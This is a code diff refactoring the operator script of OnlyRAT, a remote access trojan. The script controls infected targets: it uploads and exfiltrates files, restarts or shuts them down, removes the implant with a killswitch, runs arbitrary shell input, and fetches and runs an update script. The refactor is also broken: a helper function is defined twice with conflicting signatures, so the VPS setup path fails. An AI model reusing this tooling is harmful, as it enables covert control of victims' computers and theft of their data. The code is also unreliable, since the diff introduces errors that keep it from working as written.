@@ -6,8 +6,6 @@
 import os
 import sys
 import getpass
-import readline
-import random as r
 from datetime import datetime
 
 # banner for display
@@ -85,13 +83,10 @@ local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.Onl
 
 # read config file
 def read_config(config_file):
-    configuration = {}
-
     # get file contents
     read_lines = open(config_file, "r").readlines()
 
-    # get target configurations
-    configuration["IPADDRESS"] = read_lines[0].strip()
+    configuration = {"IPADDRESS": read_lines[0].strip()}
     configuration["PASSWORD"] = read_lines[1].strip()
     configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
     configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
@@ -189,7 +184,6 @@ def killswitch(address, password, working, username, port):
 
 # custom upload
 def upload(address, password, working, port):
-
     # get upload file
     print("\n[~] Enter file you wish to upload :")
     upload_file = input(header)
@@ -216,7 +210,7 @@ def update():
     print("\n[*] Checking for updates...")
 
     # get latest version nubmer
-    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
+    os.system("curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
 
     # save version nubmers to memory
     current_version = float(open(f"{local_path}/version.txt", "r").read())
@@ -232,16 +226,15 @@ def update():
 
         # user input, option
         option = input(f"{header}")
-        
+
         # update
         if option == "y":
-            os.system(f"bash ~/.OnlyRAT/payloads/update.sh")
+            os.system("bash ~/.OnlyRAT/payloads/update.sh")
 
-        # exception
-        # else:
-        #     main()
+            # exception
+            # else:
+            #     main()
 
-    # otherwise, run main code
     else:
         print("\n[+] OnlyRAT already up to date")
         print("[*] Hit any key to continue...\n")
@@ -266,62 +259,39 @@ def remove():
 
 # download configuration file
 def download_config():
-
-    # user input, address
-    print("[~] What is the VPS User? : ")
-    user = input(header)
-    print()
-
-    # user input, address
-    print("[~] What is the VPS IP Address? : ")
-    address = input(header)
-    print()
-
-    # user input, address
-    print("[~] What is the VPS Port? : ")
-    port = input(header)
-    print()
-
-
+    user = parameters("[~] What is the VPS User? : ")
+    address = parameters("[~] What is the VPS IP Address? : ")
+    port = parameters("[~] What is the VPS Port? : ")
     # format vps
     vps = f"{user}@{address}"
 
     # confirm values
     print("[~] Is The Following Correct? : [y/n]")
-    print(vps)
-    confirm = input(header)
-    print()
-
+    confirm = parameters(vps)
     # if yes
-    if confirm == "y" or confirm == "yes":
+    if confirm in ["y", "yes"]:
         print("[*] Downloading configuration...")
         os.system(f"scp -P {port} {vps}:/home/{user}/*.rat .")
-    
-    # if no
-    elif confirm == "n" or confirm == "no":
+
+    elif confirm in ["n", "no"]:
         download_config()
-        
-    # exception
+
     else:
         print("[!!] Value Not Recognized")
 
+def parameters(arg0):
+    # user input, address
+    print(arg0)
+    result = input(header)
+    print()
+
+    return result
+
 # setup vps
 def setup_vps():
-    # user input, address
-    print("[~] What is the VPS User? : ")
-    user = input(header)
-    print()
-
-    # user input, address
-    print("[~] What is the VPS IP Address? : ")
-    address = input(header)
-    print()
-
-    # user input, port
-    print("[~] What is the VPS Port? : ")
-    port = input(header)
-    print()
-
+    user = vps_parameters("[~] What is the VPS User? : ")
+    address = vps_parameters("[~] What is the VPS IP Address? : ")
+    port = vps_parameters("[~] What is the VPS Port? : ")
     # format vps
     vps = f"{user}@{address}"
 
@@ -332,10 +302,18 @@ def setup_vps():
     print()
 
     # if yes
-    if confirm == "y" or confirm == "yes":
+    if confirm in ["y", "yes"]:
+        vps_parameters(port, vps, user)
+    elif confirm in ["n", "no"]:
+        setup_vps()
 
-            # ssh vps settings
-            print("""
+    else:
+        print("[!!] Value Not Recognized")
+
+
+def vps_parameters(port, vps, user):
+    # ssh vps settings
+    print("""
             [!] READ ALL INSTRUCTIONS CAREFULLY
 
             [+] Setting up VPS
@@ -358,13 +336,13 @@ def setup_vps():
                 - set NO PASSWORD
             """)
 
-            # creating ssh key
-            os.system("ssh-keygen")
-            os.system("chmod 600 key")
-            os.system(f"ssh-copy-id -i key -p {port} {vps}")
+    # creating ssh key
+    os.system("ssh-keygen")
+    os.system("chmod 600 key")
+    os.system(f"ssh-copy-id -i key -p {port} {vps}")
 
-            # confirmation
-            print(f"""
+    # confirmation
+    print(f"""
             [+] The Key Has Been Generated
 
             [*] To Test It, You Can Run:
@@ -373,11 +351,11 @@ def setup_vps():
             [*] Uploading SSH Key to VPS...
             """)
 
-            # upload ssh key to vps
-            os.system(f"scp -P {port} -r key {vps}:/home/{user}")
+    # upload ssh key to vps
+    os.system(f"scp -P {port} -r key {vps}:/home/{user}")
 
-            # final vps settings
-            print("""
+    # final vps settings
+    print("""
             [+] The Key Has Been Uploaded
                 - You may need to move the key to '/var/www/html' 
                 if you plan to use apache2 for your webserver
@@ -408,13 +386,13 @@ def setup_vps():
             [+] Congrats! You are all set up!
             """)
 
-    # if no
-    elif confirm == "n" or confirm == "no":
-        setup_vps()
-        
-    # exception
-    else:
-        print("[!!] Value Not Recognized")
+def vps_parameters(arg0):
+    # user input, address
+    print(arg0)
+    result = input(header)
+    print()
+
+    return result
 
 # command line interface
 def cli(arguments):
@@ -433,7 +411,6 @@ def cli(arguments):
 
             # loop user input
             while True:
-
                 # user input, option
                 option = input(header)
                 rat_file = argument
@@ -441,7 +418,7 @@ def cli(arguments):
                 # check if configuration file exists
                 try:
                     configuration = read_config(rat_file)
-            
+
                 except FileNotFoundError: 
                     print("\n[!!] File does not exist")
                     exit()
@@ -459,59 +436,47 @@ def cli(arguments):
                 # get current connection type
                 ipv4 = remote_host if connection_type == "remote" else local_host
                 port = remote_port if connection_type == "remote" else "22"
-                
+
                 # remote console
                 if option == "orconsole":
                     connect(ipv4, password, port)
 
-                # fix remote console
                 elif option == "fix orconsole":
                     os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password} {port}")
 
-                # set remote connection
                 elif option == "set connection local":
                     edit_connection(rat_file, "local")
 
-                # set local connection
                 elif option == "set connection remote":
                     edit_connection(rat_file, "remote")
 
-                # custom upload
                 elif option == "upload":
                     upload(ipv4, password, working_direcory, port)
 
-                # custom download
-                elif option == "download" or option == "exfiltrate":
+                elif option in ["download", "exfiltrate"]:
                     download(ipv4, password, port)
 
-                # restart target option
                 elif option == "restart":
                     remote_command(ipv4, password, "shutdown /r", port)
-                    
-                # shutdown target option
+
                 elif option == "shutdown":
                     remote_command(ipv4, password, "shutdown", port)
 
-                # help menu
                 elif option == "help":
                     print(banner)
                     print(options_menu)
 
-                # display config file info
                 elif option == "config":
                     print_config(configuration)
                     print(f"USERNAME : {target_username}")
-                
-                # get version number
+
                 elif option == "version":
                     os.system(f"cat {local_path}/version.txt")
 
-                # update option
                 elif option == "update":
                     update()
                     exit()
 
-                # kill switch
                 elif option == "killswitch":
                     print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
                     confirm = input(header)
@@ -521,59 +486,46 @@ def cli(arguments):
                     else:
                         main()
 
-                # onlyrat manual
-                elif option == "man" or option == "manual":
-                    os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+                elif option in ["man", "manual"]:
+                    os.system("xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
 
-                # remove installation
-                elif option == "remove" or option == "uninstall":
+                elif option in ["remove", "uninstall"]:
                     remove()
 
-                # quit option
-                elif option == "quit" or option == "exit":
+                elif option in ["quit", "exit"]:
                     exit()
 
-                # exception
                 else:
                     os.system(option)
-                
+
                 # new line for cleaner UI
                 print("\n")
 
-        # download configuration file argument
-        elif argument == "--dfig" or argument == "-d" or argument == "--download":
+        elif argument in ["--dfig", "-d", "--download"]:
             download_config()
 
-        # setup vps argument
-        elif argument == "--setup" or argument == "-s":
+        elif argument in ["--setup", "-s"]:
             setup_vps()
 
-        # onlyrat manual argument
-        elif argument == "--manual" or argument == "-m" or argument == "--man":
-            os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+        elif argument in ["--manual", "-m", "--man"]:
+            os.system("xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
 
-        # onlyrat version argument
-        elif argument == "--version" or argument == "-v":
+        elif argument in ["--version", "-v"]:
             os.system(f"cat {local_path}/version.txt")
 
-        # update onlyrat argument
-        elif argument == "--update" or argument == "-u":
+        elif argument in ["--update", "-u"]:
             update()
             exit()
-            
-        # remove onlyrat argument
-        elif argument == "--remove" or argument == "-r" or argument == "--uninstall": 
+
+        elif argument in ["--remove", "-r", "--uninstall"]: 
             remove()
 
-        # help menu argument
-        elif argument == "--help" or argument == "-h":
+        elif argument in ["--help", "-h"]:
             print(help_menu)
 
-        # exception
         else:
             print("[!!] Argument Not Recognized")
 
-    # if arguments don't exist
     else:
         print(help_menu)
 
@@ -594,7 +546,5 @@ def main():
     # run command line interface
     cli(arguments_exist)
 
-# runs main code
 if __name__ == "__main__":
-    # runs main function
     main()
